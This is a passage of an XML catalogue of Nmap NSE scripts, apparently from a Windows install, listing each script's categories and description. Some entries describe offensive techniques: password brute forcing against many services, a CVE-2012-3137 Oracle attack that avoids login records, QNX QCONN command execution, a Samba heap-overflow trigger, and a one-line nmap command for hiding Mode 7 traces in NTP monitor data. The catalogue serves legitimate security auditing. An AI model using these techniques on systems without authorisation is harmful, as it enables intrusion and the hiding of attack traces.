<description>Performs brute force password auditing against an Nping Echo service.&#xa;&#xa;See https://nmap.org/book/nping-man-echo-mode.html for Echo Mode&#xa;documentation.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\nrpe-enum.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Queries Nagios Remote Plugin Executor (NRPE) daemons to obtain information such&#xa;as load averages, process counts, logged in user information, etc.&#xa;&#xa;This script attempts to execute the stock list of commands that are&#xa;enabled. User-supplied arguments are not supported.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ntp-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Gets the time and configuration variables from an NTP server. We send two&#xa;requests: a time request and a &quot;read variables&quot; (opcode 2) control message.&#xa;Without verbosity, the script shows the time and the value of the&#xa;&lt;code&gt;version&lt;/code&gt;, &lt;code&gt;processor&lt;/code&gt;, &lt;code&gt;system&lt;/code&gt;,&#xa;&lt;code&gt;refid&lt;/code&gt;, and &lt;code&gt;stratum&lt;/code&gt; variables. With verbosity, all&#xa;variables are shown.&#xa;&#xa;See RFC 1035 and the Network Time Protocol Version 4 Reference and&#xa;Implementation Guide&#xa;(http://www.eecis.udel.edu/~mills/database/reports/ntp4/ntp4.pdf) for&#xa;documentation of the protocol.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ntp-monlist.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Obtains and prints an NTP server&apos;s monitor data.&#xa;&#xa;Monitor data is a list of the most recently used (MRU) having NTP associations&#xa;with the target. Each record contains information about the most recent NTP&#xa;packet sent by a host to the target including the source and destination&#xa;addresses and the NTP version and mode of the packet. With this information it&#xa;is possible to classify associated hosts as Servers, Peers, and Clients.&#xa;&#xa;A Peers command is also sent to the target and the peers list in the response&#xa;allows differentiation between configured Mode 1 Peers and clients which act&#xa;like Peers (such as the Windows W32Time service).&#xa;&#xa;Associated hosts are further classified as either public or private.&#xa;Private hosts are those&#xa;having IP addresses which are not routable on the public Internet and thus can&#xa;help to form a picture about the topology of the private network on which the&#xa;target resides.&#xa;&#xa;Other information revealed by the monlist and peers commands are the host with&#xa;which the target clock is synchronized and hosts which send Control Mode (6)&#xa;and Private Mode (7) commands to the target and which may be used by admins for&#xa;the NTP service.&#xa;&#xa;It should be noted that the very nature of the NTP monitor data means that the&#xa;Mode 7 commands sent by this script are recorded by the target (and will often&#xa;appear in these results). Since the monitor data is a MRU list, it is probable&#xa;that you can overwrite the record of the Mode 7 command by sending an innocuous&#xa;looking Client Mode request. This can be achieved easily using Nmap:&#xa;&lt;code&gt;nmap -sU -pU:123 -Pn -n -&#45;max-retries=0 &lt;target&gt;&lt;/code&gt;&#xa;&#xa;Notes:&#xa;* The monitor list in response to the monlist command is limited to 600 associations.&#xa;* The monitor capability may not be enabled on the target in which case you may receive an error number 4 (No Data Available).&#xa;* There may be a restriction on who can perform Mode 7 commands (e.g. &quot;restrict noquery&quot; in &lt;code&gt;ntp.conf&lt;/code&gt;) in which case you may not receive a reply.&#xa;* This script does not handle authenticating and targets expecting auth info may respond with error number 3 (Format Error).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\omp2-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
<description>Performs brute force password auditing against the OpenVAS manager using OMPv2.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\omp2-enum-targets.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Attempts to retrieve the list of target systems and networks from an OpenVAS Manager server.&#xa;&#xa;The script authenticates on the manager using provided or previously cracked&#xa;credentials and gets the list of defined targets for each account.&#xa;&#xa;These targets will be added to the scanning queue in case&#xa;&lt;code&gt;newtargets&lt;/code&gt; global variable is set.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\omron-info.nse">
<categories><category>discovery</category><category>version</category></categories>
<description>This NSE script is used to send a FINS packet to a remote device. The script&#xa;will send a Controller Data Read Command and once a response is received, it&#xa;validates that it was a proper response to the command that was sent, and then&#xa;will parse out the data.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\openflow-info.nse">
<categories><category>default</category><category>safe</category></categories>
<description>Queries OpenFlow controllers for information. Newer versions of the OpenFlow&#xa;protocol (1.3 and greater) will return a list of all protocol versions supported&#xa;by the controller. Versions prior to 1.3 only return their own version number.&#xa;&#xa;For additional information:&#xa;* https://www.opennetworking.org/images/stories/downloads/sdn-resources/onf-specifications/openflow/openflow-switch-v1.5.0.noipr.pdf&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\openlookup-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category><category>version</category></categories>
<description>Parses and displays the banner information of an OpenLookup (network key-value store) server.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\openvas-otp-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against a OpenVAS vulnerability scanner daemon using the OTP 1.0 protocol.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\openwebnet-discovery.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>OpenWebNet is a communications protocol developed by Bticino since 2000.&#xa;Retrieves device identifying information and number of connected devices.&#xa;&#xa;References:&#xa;* https://www.myopen-legrandgroup.com/solution-gallery/openwebnet/&#xa;* http://www.pimyhome.org/wiki/index.php/OWN_OpenWebNet_Language_Reference&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\oracle-brute-stealth.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Exploits the CVE-2012-3137 vulnerability, a weakness in Oracle&apos;s&#xa;O5LOGIN authentication scheme.  The vulnerability exists in Oracle 11g&#xa;R1/R2 and allows linking the session key to a password hash.  When&#xa;initiating an authentication attempt as a valid user the server will&#xa;respond with a session key and salt.  Once received the script will&#xa;disconnect the connection thereby not recording the login attempt.&#xa;The session key and salt can then be used to brute force the users&#xa;password.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\oracle-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against Oracle servers.&#xa;&#xa;Running it in default mode it performs an audit against a list of common&#xa;Oracle usernames and passwords. The mode can be changed by supplying the&#xa;argument oracle-brute.nodefault at which point the script will use the&#xa;username- and password- lists supplied with Nmap. Custom username- and&#xa;password- lists may be supplied using the userdb and passdb arguments.&#xa;The default credential list can be changed too by using the brute.credfile&#xa;argument. In case the userdb or passdb arguments are supplied, the script&#xa;assumes that it should run in the nodefault mode.&#xa;&#xa;In modern versions of Oracle password guessing speeds decrease after a few&#xa;guesses and remain slow, due to connection throttling.&#xa;&#xa;WARNING: The script makes no attempt to discover the amount of guesses&#xa;that can be made before locking an account. Running this script may therefor&#xa;result in a large number of accounts being locked out on the database server.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\oracle-enum-users.nse">
<categories><category>intrusive</category><category>auth</category></categories>
<description>Attempts to enumerate valid Oracle user names against unpatched Oracle 11g&#xa;servers (this bug was fixed in Oracle&apos;s October 2009 Critical Patch Update).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\oracle-sid-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Guesses Oracle instance/SID names against the TNS-listener.&#xa;&#xa;If the &lt;code&gt;oraclesids&lt;/code&gt; script argument is not used to specify an&#xa;alternate file, the default &lt;code&gt;oracle-sids&lt;/code&gt; file will be used.&#xa;License to use the &lt;code&gt;oracle-sids&lt;/code&gt; file was granted by its&#xa;author, Alexander Kornbrust (http://seclists.org/nmap-dev/2009/q4/645).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\oracle-tns-version.nse">
<categories><category>version</category><category>safe</category></categories>
<description>Decodes the VSNNUM version number from an Oracle TNS listener.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ovs-agent-version.nse">
<categories><category>version</category></categories>
<description>Detects the version of an Oracle Virtual Server Agent by fingerprinting&#xa;responses to an HTTP GET request and an XML-RPC method call.&#xa;&#xa;Version 2.2 of Virtual Server Agent returns a distinctive string in response to an&#xa;HTTP GET request. However versions 3.0 and 3.0.1 return a generic response that&#xa;looks like any other BaseHTTP/SimpleXMLRPCServer. Versions 2.2 and 3.0 return a&#xa;distinctive error message in response to a &lt;code&gt;system.listMethods&lt;/code&gt;&#xa;XML-RPC call, which however does not distinguish the two versions. Version 3.0.1&#xa;returns a response to &lt;code&gt;system.listMethods&lt;/code&gt; that is different from&#xa;that of both version 2.2 and 3.0. Therefore we use this strategy: (1.) Send a&#xa;GET request. If the version 2.2 string is returned, return &quot;2.2&quot;. (2.) Send a&#xa;&lt;code&gt;system.listMethods&lt;/code&gt; method call. If an error is&#xa;returned, return &quot;3.0&quot; or &quot;3.0.1&quot;, depending on the specific format of the&#xa;error.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\p2p-conficker.nse">
<categories><category>default</category><category>safe</category></categories>
<description>Checks if a host is infected with Conficker.C or higher, based on&#xa;Conficker&apos;s peer to peer communication.&#xa;&#xa;When Conficker.C or higher infects a system, it opens four ports: two TCP&#xa;and two UDP. The ports are random, but are seeded with the current week and&#xa;the IP of the infected host. By determining the algorithm, one can check if&#xa;these four ports are open, and can probe them for more data.&#xa;&#xa;Once the open ports are found, communication can be initiated using&#xa;Conficker&apos;s custom peer to peer protocol.  If a valid response is received,&#xa;then a valid Conficker infection has been found.&#xa;&#xa;This check won&apos;t work properly on a multihomed or NATed system because the&#xa;open ports will be based on a nonpublic IP.  The argument&#xa;&lt;code&gt;checkall&lt;/code&gt; tells Nmap to attempt communication with every open&#xa;port (much like a version check) and the argument &lt;code&gt;realip&lt;/code&gt; tells&#xa;Nmap to base its port generation on the given IP address instead of the&#xa;actual IP.&#xa;&#xa;By default, this will run against a system that has a standard Windows port&#xa;open (445, 139, 137). The arguments &lt;code&gt;checkall&lt;/code&gt; and&#xa;&lt;code&gt;checkconficker&lt;/code&gt; will both perform checks regardless of which&#xa;port is open, see the args section for more information.&#xa;&#xa;Note: Ensure your clock is correct (within a week) before using this script!&#xa;&#xa;The majority of research for this script was done by Symantec Security&#xa;Response, and some was taken from public sources (most notably the port&#xa;blacklisting was found by David Fifield). A big thanks goes out to everybody&#xa;who contributed!&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\path-mtu.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Performs simple Path MTU Discovery to target hosts.&#xa;&#xa;TCP or UDP packets are sent to the host with the DF (don&apos;t fragment) bit set&#xa;and with varying amounts of data.  If an ICMP Fragmentation Needed is received,&#xa;or no reply is received after retransmissions, the amount of data is lowered&#xa;and another packet is sent.  This continues until (assuming no errors occur) a&#xa;reply from the final host is received, indicating the packet reached the host&#xa;without being fragmented.&#xa;&#xa;Not all MTUs are attempted so as to not expend too much time or network&#xa;resources.  Currently the relatively short list of MTUs to try contains&#xa;the plateau values from Table 7-1 in RFC 1191, &quot;Path MTU Discovery&quot;.&#xa;Using these values significantly cuts down the MTU search space.  On top&#xa;of that, this list is rarely traversed in whole because:&#xa;* the MTU of the outgoing interface is used as a starting point, and&#xa;* we can jump down the list when an intermediate router sending a &quot;can&apos;t fragment&quot; message includes its next hop MTU (as described in RFC 1191 and required by RFC 1812)&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\pcanywhere-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against the pcAnywhere remote access protocol.&#xa;&#xa;Due to certain limitations of the protocol, bruteforcing&#xa;is limited to single thread at a time.&#xa;After a valid login pair is guessed the script waits&#xa;some time until server becomes available again.&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\pcworx-info.nse">
<categories><category>discovery</category></categories>
<description>This NSE script will query and parse pcworx protocol to a remote PLC.&#xa;The script will send a initial request packets and once a response is received,&#xa;it validates that it was a proper response to the command that was sent, and then&#xa;will parse out the data. PCWorx is a protocol and Program by Phoenix Contact.&#xa;&#xa;&#xa;http://digitalbond.com&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\pgsql-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs password guessing against PostgreSQL.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\pjl-ready-message.nse">
<categories><category>intrusive</category></categories>
<description>Retrieves or sets the ready message on printers that support the Printer&#xa;Job Language. This includes most PostScript printers that listen on port&#xa;9100. Without an argument, displays the current ready message. With the&#xa;&lt;code&gt;pjl_ready_message&lt;/code&gt; script argument, displays the old ready&#xa;message and changes it to the message given.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\pop3-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Tries to log into a POP3 account by guessing usernames and passwords.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\pop3-capabilities.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Retrieves POP3 email server capabilities.&#xa;&#xa;POP3 capabilities are defined in RFC 2449. The CAPA command allows a client to&#xa;ask a server what commands it supports and possibly any site-specific policy.&#xa;Besides the list of supported commands, the IMPLEMENTATION string giving the&#xa;server version may be available.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\pop3-ntlm-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>This script enumerates information from remote POP3 services with NTLM&#xa;authentication enabled.&#xa;&#xa;Sending a POP3 NTLM authentication request with null credentials will&#xa;cause the remote service to respond with a NTLMSSP message disclosing&#xa;information to include NetBIOS, DNS, and OS build version.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\port-states.nse">
<categories><category>safe</category></categories>
<description>Prints a list of ports found in each state.&#xa;&#xa;Nmap ordinarily summarizes &quot;uninteresting&quot; ports as &quot;Not shown: 94 closed&#xa;ports, 4 filtered ports&quot; but users may want to know which ports were filtered&#xa;vs which were closed. This script will expand these summaries into a list of&#xa;ports and port ranges that were found in each state.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\pptp-version.nse">
<categories><category>version</category></categories>
<description>Attempts to extract system information from the point-to-point tunneling protocol (PPTP) service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\puppet-naivesigning.nse">
<categories><category>intrusive</category><category>vuln</category></categories>
<description>Detects if naive signing is enabled on a Puppet server. This enables attackers&#xa;to create any Certificate Signing Request and have it signed, allowing them&#xa;to impersonate as a puppet agent. This can leak the configuration of the agents&#xa;as well as any other sensitive information found in the configuration files.&#xa;&#xa;This script makes use of the Puppet HTTP API interface to sign the request.&#xa;&#xa;This script has been Tested on versions 3.8.5, 4.10.&#xa;&#xa;References:&#xa;* https://docs.puppet.com/puppet/4.10/ssl_autosign.html#security-implications-of-nave-autosigning&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\qconn-exec.nse">
<categories><category>intrusive</category><category>exploit</category><category>vuln</category></categories>
<description>Attempts to identify whether a listening QNX QCONN daemon allows&#xa;unauthenticated users to execute arbitrary operating system commands.&#xa;&#xa;QNX is a commercial Unix-like real-time operating system, aimed primarily at&#xa;the embedded systems market. The QCONN daemon is a service provider that&#xa;provides support, such as profiling system information, to remote IDE&#xa;components. The QCONN daemon runs on port 8000 by default.&#xa;&#xa;For more information about QNX QCONN, see:&#xa;* http://www.qnx.com/developers/docs/6.3.0SP3/neutrino/utilities/q/qconn.html&#xa;* http://www.fishnetsecurity.com/6labs/blog/pentesting-qnx-neutrino-rtos&#xa;* http://www.exploit-db.com/exploits/21520&#xa;* http://metasploit.org/modules/exploit/unix/misc/qnx_qconn_exec&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\qscan.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Repeatedly probe open and/or closed ports on a host to obtain a series&#xa;of round-trip time values for each port.  These values are used to&#xa;group collections of ports which are statistically different from other&#xa;groups.  Ports being in different groups (or &quot;families&quot;) may be due to&#xa;network mechanisms such as port forwarding to machines behind a NAT.&#xa;&#xa;In order to group these ports into different families, some statistical&#xa;values must be computed.  Among these values are the mean and standard&#xa;deviation of the round-trip times for each port.  Once all of the times&#xa;have been recorded and these values have been computed, the Student&apos;s&#xa;t-test is used to test the statistical significance of the differences&#xa;between each port&apos;s data.  Ports which have round-trip times that are&#xa;statistically the same are grouped together in the same family.&#xa;&#xa;This script is based on Doug Hoyte&apos;s Qscan documentation and patches&#xa;for Nmap.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\quake1-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category><category>version</category></categories>
<description>Extracts information from Quake game servers and other game servers&#xa;which use the same protocol.&#xa;&#xa;Quake uses UDP packets, which because of source spoofing can be used to amplify&#xa;a denial-of-service attack. For each request, the script reports the payload&#xa;amplification as a ratio. The format used is&#xa;&lt;code&gt;response_bytes/request_bytes=ratio&lt;/code&gt;&#xa;&#xa;http://www.gamers.org/dEngine/quake/QDP/qnp.html&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\quake3-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category><category>version</category></categories>
<description>Extracts information from a Quake3 game server and other games which use the same protocol.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\quake3-master-getservers.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Queries Quake3-style master servers for game servers (many games other than Quake 3 use this same protocol).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rdp-enum-encryption.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Determines which Security layer and Encryption level is supported by the&#xa;RDP service. It does so by cycling through all existing protocols and ciphers.&#xa;When run in debug mode, the script also returns the protocols and ciphers that&#xa;fail and any errors that were reported.&#xa;&#xa;The script was inspired by MWR&apos;s RDP Cipher Checker&#xa;http://labs.mwrinfosecurity.com/tools/2009/01/12/rdp-cipher-checker/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rdp-ntlm-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>This script enumerates information from remote RDP services with CredSSP&#xa;(NLA) authentication enabled.&#xa;&#xa;Sending an incomplete CredSSP (NTLM) authentication request with null credentials&#xa;will cause the remote service to respond with a NTLMSSP message disclosing&#xa;information to include NetBIOS, DNS, and OS build version.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rdp-vuln-ms12-020.nse">
<categories><category>intrusive</category><category>vuln</category></categories>
<description>Checks if a machine is vulnerable to MS12-020 RDP vulnerability.&#xa;&#xa;The Microsoft bulletin MS12-020 patches two vulnerabilities: CVE-2012-0152&#xa;which addresses a denial of service vulnerability inside Terminal Server, and&#xa;CVE-2012-0002 which fixes a vulnerability in Remote Desktop Protocol. Both are&#xa;part of Remote Desktop Services.&#xa;&#xa;The script works by checking for the CVE-2012-0152 vulnerability. If this&#xa;vulnerability is not patched, it is assumed that CVE-2012-0002 is not patched&#xa;either. This script can do its check without crashing the target.&#xa;&#xa;The way this works follows:&#xa;* Send one user request. The server replies with a user id (call it A) and a channel for that user.&#xa;* Send another user request. The server replies with another user id (call it B) and another channel.&#xa;* Send a channel join request with requesting user set to A and requesting channel set to B. If the server replies with a success message, we conclude that the server is vulnerable.&#xa;* In case the server is vulnerable, send a channel join request with the requesting user set to B and requesting channel set to B to prevent the chance of a crash.&#xa;&#xa;References:&#xa;* http://technet.microsoft.com/en-us/security/bulletin/ms12-020&#xa;* http://support.microsoft.com/kb/2621440&#xa;* http://zerodayinitiative.com/advisories/ZDI-12-044/&#xa;* http://aluigi.org/adv/termdd_1-adv.txt&#xa;&#xa;Original check by by Worawit Wang (sleepya).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\realvnc-auth-bypass.nse">
<categories><category>auth</category><category>safe</category><category>vuln</category></categories>
<description>Checks if a VNC server is vulnerable to the RealVNC authentication bypass&#xa;(CVE-2006-2369).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\redis-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force passwords auditing against a Redis key-value store.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\redis-info.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Retrieves information (such as version number and architecture) from a Redis key-value store.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\resolveall.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>NOTE: This script has been replaced by the &lt;code&gt;-&#45;resolve-all&lt;/code&gt;&#xa;command-line option in Nmap 7.70&#xa;&#xa;Resolves hostnames and adds every address (IPv4 or IPv6, depending on&#xa;Nmap mode) to Nmap&apos;s target list.  This differs from Nmap&apos;s normal&#xa;host resolution process, which only scans the first address (A or AAAA&#xa;record) returned for each host name.&#xa;&#xa;The script will run on any target provided by hostname. It can also be fed&#xa;hostnames via the &lt;code&gt;resolveall.hosts&lt;/code&gt; argument. Because it adds new&#xa;targets by IP address it will not run recursively, since those new targets were&#xa;not provided by hostname. It will also not add the same IP that was initially&#xa;chosen for scanning by Nmap.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\reverse-index.nse">
<categories><category>safe</category></categories>
<description>Creates a reverse index at the end of scan output showing which hosts run a&#xa;particular service.  This is in addition to Nmap&apos;s normal output listing the&#xa;services on each host.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rexec-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
<description>Performs brute force password auditing against the classic UNIX rexec (remote exec) service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rfc868-time.nse">
<categories><category>discovery</category><category>safe</category><category>version</category></categories>
<description>Retrieves the day and time from the Time service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\riak-http-info.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Retrieves information (such as node name and architecture) from a Basho Riak distributed database using the HTTP protocol.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rlogin-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
<description>Performs brute force password auditing against the classic UNIX rlogin (remote&#xa;login) service.  This script must be run in privileged mode on UNIX because it&#xa;must bind to a low source port number.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rmi-dumpregistry.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Connects to a remote RMI registry and attempts to dump all of its&#xa;objects.&#xa;&#xa;First it tries to determine the names of all objects bound in the&#xa;registry, and then it tries to determine information about the&#xa;objects, such as the the class names of the superclasses and&#xa;interfaces. This may, depending on what the registry is used for, give&#xa;valuable information about the service. E.g, if the app uses JMX (Java&#xa;Management eXtensions), you should see an object called &quot;jmxconnector&quot;&#xa;on it.&#xa;&#xa;It also gives information about where the objects are located, (marked&#xa;with @&lt;ip&gt;:port in the output).&#xa;&#xa;Some apps give away the classpath, which this scripts catches in&#xa;so-called &quot;Custom data&quot;.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rmi-vuln-classloader.nse">
<categories><category>intrusive</category><category>vuln</category></categories>
<description>Tests whether Java rmiregistry allows class loading.  The default&#xa;configuration of rmiregistry allows loading classes from remote URLs,&#xa;which can lead to remote code execution. The vendor (Oracle/Sun)&#xa;classifies this as a design feature.&#xa;&#xa;&#xa;Based on original Metasploit module by mihi.&#xa;&#xa;References:&#xa;* https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rpc-grind.nse">
<categories><category>version</category></categories>
<description>Fingerprints the target RPC port to extract the target service, RPC number and version.&#xa;&#xa;The script works by sending RPC Null call requests with a random high version&#xa;unsupported number to the target service with iterated over RPC program numbers&#xa;from the nmap-rpc file and check for replies from the target port.&#xa;A reply with a RPC accept state 2 (Remote can&apos;t support version) means that we&#xa;the request sent the matching program number, and we proceed to extract the&#xa;supported versions. A reply with an accept state RPC accept state 1 (remote&#xa;hasn&apos;t exported program) means that we have sent the incorrect program number.&#xa;Any other accept state is an incorrect behaviour.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rpcap-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against the WinPcap Remote Capture&#xa;Daemon (rpcap).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rpcap-info.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Connects to the rpcap service (provides remote sniffing capabilities&#xa;through WinPcap) and retrieves interface information. The service can either be&#xa;setup to require authentication or not and also supports IP restrictions.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rpcinfo.nse">
<categories><category>discovery</category><category>default</category><category>safe</category><category>version</category></categories>
<description>Connects to portmapper and fetches a list of all registered programs.  It then&#xa;prints out a table including (for each program) the RPC program number,&#xa;supported version numbers, port number and protocol, and program name.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rsa-vuln-roca.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Detects RSA keys vulnerable to Return Of Coppersmith Attack (ROCA) factorization.&#xa;&#xa;SSH hostkeys and SSL/TLS certificates are checked. The checks require recent updates to the openssl NSE library.&#xa;&#xa;References:&#xa;* https://crocs.fi.muni.cz/public/papers/rsa_ccs17&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rsync-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
<description>Performs brute force password auditing against the rsync remote file syncing protocol.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rsync-list-modules.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Lists modules available for rsync (remote file sync) synchronization.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rtsp-methods.nse">
<categories><category>default</category><category>safe</category></categories>
<description>Determines which methods are supported by the RTSP (real time streaming protocol) server.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rtsp-url-brute.nse">
<categories><category>brute</category><category>intrusive</category></categories>
<description>Attempts to enumerate RTSP media URLS by testing for common paths on devices such as surveillance IP cameras.&#xa;&#xa;The script attempts to discover valid RTSP URLs by sending a DESCRIBE&#xa;request for each URL in the dictionary. It then parses the response, based&#xa;on which it determines whether the URL is valid or not.&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\rusers.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Connects to rusersd RPC service and retrieves a list of logged-in users.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\s7-info.nse">
<categories><category>discovery</category><category>version</category></categories>
<description>Enumerates Siemens S7 PLC Devices and collects their device information. This&#xa;script is based off PLCScan that was developed by Positive Research and&#xa;Scadastrangelove (https://code.google.com/p/plcscan/). This script is meant to&#xa;provide the same functionality as PLCScan inside of Nmap. Some of the&#xa;information that is collected by PLCScan was not ported over; this&#xa;information can be parsed out of the packets that are received.&#xa;&#xa;Thanks to Positive Research, and Dmitry Efanov for creating PLCScan&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\samba-vuln-cve-2012-1182.nse">
<categories><category>vuln</category><category>intrusive</category></categories>
<description>Checks if target machines are vulnerable to the Samba heap overflow vulnerability CVE-2012-1182.&#xa;&#xa;Samba versions 3.6.3 and all versions previous to this are affected by&#xa;a vulnerability that allows remote code execution as the &quot;root&quot; user&#xa;from an anonymous connection.&#xa;&#xa;&#xa;CVE-2012-1182 marks multiple heap overflow vulnerabilities located in&#xa;PIDL based autogenerated code. This check script is based on PoC by ZDI&#xa;marked as ZDI-CAN-1503. Vulnerability lies in ndr_pull_lsa_SidArray&#xa;function where an attacker is under control of num_sids and can cause&#xa;insufficient memory to be allocated, leading to heap buffer overflow&#xa;and possibility of remote code execution.&#xa;&#xa;Script builds a malicious packet and makes a SAMR GetAliasMembership&#xa;call which triggers the vulnerability. On the vulnerable system,&#xa;connection is dropped and result is &quot;Failed to receive bytes after 5 attempts&quot;.&#xa;On patched system, samba throws an error and result is  &quot;MSRPC call&#xa;returned a fault (packet type)&quot;.&#xa;&#xa;References:&#xa;* https://bugzilla.samba.org/show_bug.cgi?id=8815&#xa;* http://www.samba.org/samba/security/CVE-2012-1182&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\servicetags.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to extract system information (OS, hardware, etc.) from the Sun Service Tags service agent (UDP port 6481).&#xa;&#xa;Based on protocol specs from&#xa;http://arc.opensolaris.org/caselog/PSARC/2006/638/stdiscover_protocolv2.pdf&#xa;http://arc.opensolaris.org/caselog/PSARC/2006/638/stlisten_protocolv2.pdf&#xa;http://arc.opensolaris.org/caselog/PSARC/2006/638/ServiceTag_API_CLI_v07.pdf&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\shodan-api.nse">
<categories><category>discovery</category><category>safe</category><category>external</category></categories>
<description>Queries Shodan API for given targets and produces similar output to&#xa;a -sV nmap scan. The ShodanAPI key can be set with the &apos;apikey&apos; script&#xa;argument, or hardcoded in the .nse file itself. You can get a free key from&#xa;https://developer.shodan.io&#xa;&#xa;N.B if you want this script to run completely passively make sure to&#xa;include the -sn -Pn -n flags.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\sip-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against Session Initiation Protocol&#xa;(SIP) accounts. This protocol is most commonly associated with VoIP sessions.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\sip-call-spoof.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
